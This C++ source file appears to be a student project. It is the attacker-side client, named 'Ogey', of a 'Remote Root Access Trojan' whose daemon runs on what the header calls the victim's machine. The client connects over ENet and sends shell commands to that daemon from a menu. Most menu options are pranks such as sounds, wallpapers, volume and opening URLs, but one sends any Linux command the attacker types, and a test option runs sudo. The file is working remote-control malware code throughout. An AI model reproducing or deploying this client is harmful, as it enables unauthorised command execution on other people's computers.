/*
    RRAT: Remote Root Access Trojan

    Ogey: La contraparte de RRAT.
    
    Este programa escanea la red local para detectar
    si algún programa está ejecutando el "Demon", el
    cual es el daemon de RRAT.
    Al conectar, se podrán enviar comandos a Demon.

    ------------------------------------------------
    Ejecución:
        - Manual, la ejecuta el atacante desde
        su PC o móvil

    Función:
        1. Enviar "ogey" a todos los ordenadores en la
            red local hasta que uno de ellos responda
            con "rrat".
        
        2. Al conectar con un ordenador, se me mostrará
            la IP de la víctima para poder conectarme
            por SSH
        
        3. Un menú también me permitirá seleccionar
            una acción que se enviará a Demon para que
            se ejecute desde la sesión del usuario.

            Esto se puede usar para abrir ventanas
            o cambiar configuraciones del DE (por
            motivos demostrativos el DE es KDE Plasma)

    ________________________________________________
    Sistemas Informáticos - 1°DAW - 2024
    Por: Javier Sanz Valero
*/

// includes
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iostream>
#include <regex>
#include <stdexcept>
#include <string>
#include <sys/types.h>

// ENet
#include <enet/enet.h>
#include <thread>

// Function Prototypes
uint8_t showMenu();
void SendPacket(ENetPeer* peer, const char* data);
void SendCommand(ENetPeer* peer, uint8_t command);

// ENet Code here
void runEnetLoop(ENetHost* client, ENetEvent& event, ENetPeer* peer, bool& running);

std::string getAddress();

// main
int main() {
    // Initialize ENet
    if (enet_initialize() != 0) {
        std::cout << "An error occurred while initializing ENet.\n";
        return EXIT_FAILURE;
    }

    atexit(enet_deinitialize);

    // We create a client now
    ENetHost* client;

    client = enet_host_create(
        NULL,
        1, // 1 connection (server)
        1, // 1 channel
        0, // Any incoming bandwidth
        0  // Any outcoming bandwidth
    );

    // oops
    if (client == NULL) {
        std::cout << "Can't create client, no Ogey for you.\n";
        return EXIT_FAILURE;
    }

    ENetAddress address;
    ENetEvent event;
    ENetPeer* peer;

    // Set Address
    // TODO: AUTOMATE!
    // enet_address_set_host(&address, "127.0.0.1");
    enet_address_set_host(&address, getAddress().c_str());
    address.port = 7654;

    peer = enet_host_connect(client, &address, 1, 0);
	if(peer == NULL) {
    	std::cout << "Daemon not running! (or something, either way ogey is not ogeying)\n";
		return EXIT_FAILURE;
	}

	if(enet_host_service(client, &event, 5000) > 0 && event.type == ENET_EVENT_TYPE_CONNECT) {
		std::cout << "Connected to RRAT Demon!\n";
	}
	else {
		enet_peer_reset(peer);
		std::cout << "Connection failed :(\n";
		return EXIT_SUCCESS;
	}

    // Main loop
    bool running = true;

    // Create thread
    std::thread enetThread(runEnetLoop, client, std::ref(event), std::ref(peer), std::ref(running));

    // Input Thread
    while (running) {
        // Show the menu and get the input, which is the command ID
        uint8_t userInput = showMenu();

        // Do we want to exit?
        if (userInput < 1) {
            enet_peer_disconnect_now(peer, 0);
            running = false;
        }
        else if (userInput == 1) { // DEBUG
            SendPacket(peer, "echo $USER");
        }
        else if (userInput == 2) { // DEBUG
            SendPacket(peer, "sudo touch /foo.bar && ls -l /");
        }
        else if (userInput == 3) {
            // CUSTOM APP OR URL
            std::string url = "";
            std::cout << "Introduce el Programa o URL: ";
            std::getline(std::cin, url);

            std::string msg = "xdg-open " + url;

            SendPacket(peer, msg.c_str());
        }
        else if (userInput == 4) {
            // CUSTOM COMMAND
            std::string cmd = "";
            std::cout << "Introduce el Comando: ";
            std::getline(std::cin, cmd);

            SendPacket(peer, cmd.c_str());
        }
        else if (userInput == 5) {
            // SHOW PRESENTATION
            SendPacket(peer, "xdg-open https://jsanzucam.github.io/rrat-presentation/");
        }
        else if (userInput == 6) {
            // PLAY SOUND EFFECT
            std::cout <<
                "1. Vine Boom\n"
                "2. Metal Pipe Sound Effect\n"
                "3. Metal Pipe DEEP FRIED\n"
                "4. Mondongo\n"
                "5. 10 years in the joint\n"
                "6. Bring that shit Kazuma!\n"
                "7. Kiryu-chan"
                ">>> "
            ;
            std::string sinput;
            uint8_t input;
            std::getline(std::cin, sinput);

            // Check that it's a number
            std::regex reg("^[0-9]{1,10}$");
            if (!std::regex_match(sinput, reg)) {
                std::cout << "The input must be a whole number\n";
                continue;
            }
            input = std::stoi(sinput);
            if (input > 7 || input < 1) {
                continue;
            }

            std::string sound;

            switch (input) {
            case 1:
                {
                    // Vine Boom
                    sound = "~/Music/vineboom.mp3";
                }
                break;
            case 2:
                {
                    // Metal Pipe
                    sound = "~/Music/pipe.mp3";
                }
                break;
            case 3:
                {
                    // Metal Pipe STRONG
                    sound = "~/Music/deepfriedpipe.mp3";
                }
                break;
            case 4:
                {
                    // Mondongo
                    sound = "~/Music/mondongo.mp3";
                }
                break;
            case 5:
                {
                    // 10 years in the joint
                    sound = "~/Music/tenyears.mp3";
                }
                break;
            case 6:
                {
                    // Bring that shit
                    sound = "~/Music/bringthatshit.mp3";
                }
                break;
            case 7:
                {
                    // Kiryu chan
                    sound = "~/Music/kiryuchan.mp3";
                }
                break;
            }

            std::string msg = "nohup ffplay -v 0 -nodisp -autoexit " + sound + " > /dev/null 2>&1 &";
            SendPacket(peer, msg.c_str());
        }
        else if (userInput == 7) {
            // CHANGE WALLPAPER
            std::cout <<
                "1. YSBAG\n"
                "2. 10thHellPrimary\n"
                "3. yuyuedit\n"
                "4. NUnknown\n"
                ">>> "
            ;
            std::string sinput;
            uint8_t input;
            std::getline(std::cin, sinput);

            // Check that it's a number
            std::regex reg("^[0-9]{1,10}$");
            if (!std::regex_match(sinput, reg)) {
                std::cout << "The input must be a whole number\n";
                continue;
            }
            input = std::stoi(sinput);
            if (input > 4 || input < 1) {
                continue;
            }

            switch (input) {
                case 1:
                    {
                        // YSBAG
                        std::string msg = "swww img ~/Pictures/ysbag.png";
                        SendPacket(peer, msg.c_str());
                    }
                    break;
                case 2:
                    {
                        // 10thHellPrimary
                        std::string msg = "swww img ~/.wallpaper/10thHellPrimary.png";
                        SendPacket(peer, msg.c_str());
                    }
                    break;
                case 3:
                    {
                        // yuyuedit
                        std::string msg = "swww img ~/.wallpaper/yuyuedit.png";
                        SendPacket(peer, msg.c_str());
                    }
                    break;
                case 4:
                    {
                        // NUnknown
                        std::string msg = "swww img ~/.wallpaper/N+Unknown.png";
                        SendPacket(peer, msg.c_str());
                    }
                    break;
            }
        }
        else if (userInput == 8) {
            // SET VOLUME
            std::cout << "Set volume to: ";
            std::string sinput;
            uint8_t input;
            std::getline(std::cin, sinput);

            // Check that it's a number
            std::regex reg("^[0-9]{1,10}$");
            if (!std::regex_match(sinput, reg)) {
                std::cout << "The input must be a whole number\n";
                continue;
            }
            input = std::stoi(sinput);
            if (input > 100 || input < 0) {
                continue;
            }

            SendPacket(peer, std::string("pamixer --set-volume " + sinput).c_str());
        }
    }

    // Wait for it to end
    enetThread.join();

    enet_host_destroy(client);
} // main

void runEnetLoop(ENetHost* client, ENetEvent& event, ENetPeer* peer, bool& running) {
    // Send an ogey
    SendPacket(peer, "ogey");

    // Did the server send rrat?
    bool rrat = false;

    while (running) {
        // 1000ms of timeout, no events in 1 second = ENET_EVENT_TYPE_NONE
        while (enet_host_service(client, &event, 1000) > 0) {
            switch (event.type) {
                case ENET_EVENT_TYPE_CONNECT:
                    // The server connected (?)
                    std::cout << "huh?\n";
                    break;
                
                case ENET_EVENT_TYPE_RECEIVE:
                    // The daemon sent something
                    // Is it a "rrat"?
                    if (!strcmp((const char*)event.packet->data, "rrat\0")) {
                        rrat = true;
                        std::cout << "Connected!\n";
                    }

                    // We show the message
                    std::cout <<
                        "[RECEIVED FROM RRAT] " <<
                        (const char*)event.packet->data <<
                        "\n"
                    ;

                    // Destroy packet
                    enet_packet_destroy(event.packet);
                    break;

                case ENET_EVENT_TYPE_DISCONNECT:
                    // The daemon left, what the f*ck? It's the server!
                    std::cout << "Server disconnected. The daemon may be dead\n";
                    std::cout << "Check status of daemon with SSH.\n";
                    break;

                case ENET_EVENT_TYPE_NONE:
                    std::cout << "AAAAAAAAA";
                    break;
            }
        }
    }
}

// Function definitions
void SendPacket(ENetPeer* peer, const char* data) {
	ENetPacket* packet = enet_packet_create(data, strlen(data) + 1, ENET_PACKET_FLAG_RELIABLE);
	enet_peer_send(peer, 0, packet);
}
void SendCommand(ENetPeer* peer, uint8_t command) {
	ENetPacket* packet = enet_packet_create(&command, sizeof(uint8_t), ENET_PACKET_FLAG_RELIABLE);
	enet_peer_send(peer, 0, packet);
}

uint8_t showMenu() {
    std::cout <<
        "Available commands:\n"
        "1. [TEST] Show username of remote user\n"
        "2. [TEST] Create a foo.bar file in the root directory\n"
        "3. Custom program or URL\n"
        "4. Custom Linux Command\n"
        "5. Open the presentation\n"
        "6. Play a sound effect\n"
        "7. Change wallpaper\n"
        "8. Set Volume\n"
        "exit. Disconnects from the Demon\n"
    ;
    // The maximum command ID we can input
    const uint8_t MAX_ENTRY = 8;

    uint8_t input = 0; // Value for Exit
    bool validInput = false;
    while (!validInput) {
        // get input as a String, then parse
        std::string sinput;

        std::cout << ">>> ";
        std::getline(std::cin, sinput);

        // Check if it's exit
        if (sinput == "exit") {
            validInput = true;
            input = 0; // we want to exit
            continue;
        }

        // Check that it's a number
        std::regex reg("^[0-9]{1,10}$");
        if (!std::regex_match(sinput, reg)) {
            std::cout << "The input must be a whole number\n";
            continue;
        }

        input = std::stoi(sinput);

        // Check that it's in the range
        if (input < 1 || input > MAX_ENTRY) {
            std::cout << "The number must be a command.\n";
            continue;
        }

        // If we pass the checks and make it to the end of the
        // loop, we exit it
        validInput = true;
    }

    return input;
}

std::string getAddress() {
    std::ifstream file("addr");

    if (!file) {
        std::cout << "Continuing at localhost!\n"
            "Create an \"addr\" file and store the address there!\n";
        return "127.0.0.1"; // Default, test
    }

    std::string line;
    getline(file, line);

    std::cout << "ADDRESS: " + line + "\n";

    file.close();
    return line;
}